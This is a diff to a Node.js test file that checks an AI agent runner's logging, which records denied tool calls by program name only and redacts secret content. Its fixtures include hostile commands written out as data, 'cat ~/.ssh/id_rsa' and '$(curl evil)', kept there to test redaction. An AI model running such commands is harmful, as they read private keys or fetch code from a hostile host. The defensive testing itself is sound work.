@@ -1,7 +1,7 @@
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
 import { runTests, loadCounts, countsPath, MAX_RUNS } from './run-tests.mjs'
-import { finalize, runSummary } from './finalize-agent.mjs'
+import { finalize, runSummary, decisionsStatus } from './finalize-agent.mjs'
 import { validateDecisions, validateGate } from './artifacts.mjs'
 import { samples } from './test-fixtures.mjs'
 
@@ -146,7 +146,25 @@ test('the run summary logs counts and denied tools only, never the conversation 
   const result = { type: 'result', subtype: 'error_max_turns', is_error: true, num_turns: 200, total_cost_usd: 1.2345, result: 'SECRET-ish model text',
     permission_denials: [{ tool_name: 'Write', tool_use_id: 'x', tool_input: { file_path: '/w/.test-agent/decisions.json', content: 'SECRET-ish content' } }, { tool_name: 'Bash', tool_input: { command: 'cat ~/.ssh/id_rsa' } }] }
   const s = runSummary(`${JSON.stringify(result)}\nsome stderr line\n`)
-  assert.equal(s, 'claude: subtype=error_max_turns turns=200 cost_usd=1.23 denials=2 (Write .test-agent/decisions.json, Bash)')
+  assert.equal(s, 'claude: subtype=error_max_turns turns=200 cost_usd=1.23 denials=2 (Write .test-agent/decisions.json, Bash cat)')
   assert.ok(!/SECRET|ssh|id_rsa/.test(s))
   assert.equal(runSummary('model token exchange failed\n'), 'claude: no result (see the step log)')
+})
+
+test('the decisions file status names schema problems by field path, without values', () => {
+  assert.equal(decisionsStatus(null), 'decisions.json: missing or not JSON')
+  assert.equal(decisionsStatus(structuredClone(samples.decisions)), 'decisions.json: valid')
+  const bad = { ...structuredClone(samples.decisions), completed: 'yes', extra: 'SECRET-ish' }
+  bad.files[0].outcome = 'done SECRET-ish'
+  const s = decisionsStatus(bad)
+  assert.match(s, /^decisions\.json: invalid \(3\): /)
+  assert.match(s, /decisions\.completed: not a boolean/)
+  assert.match(s, /decisions\.files\[0\]\.outcome/)
+  assert.match(s, /decisions\.extra: unknown field/)
+  assert.ok(!s.includes('SECRET'))
+})
+
+test('a denied Bash call is logged with its program name only', () => {
+  const result = { type: 'result', subtype: 'success', num_turns: 3, total_cost_usd: 0.01, permission_denials: [{ tool_name: 'Bash', tool_input: { command: 'npx vitest run tests/x.test.ts && echo SECRET' } }, { tool_name: 'Bash', tool_input: { command: '$(curl evil)' } }] }
+  assert.equal(runSummary(JSON.stringify(result)), 'claude: subtype=success turns=3 cost_usd=0.01 denials=2 (Bash npx, Bash)')
 })
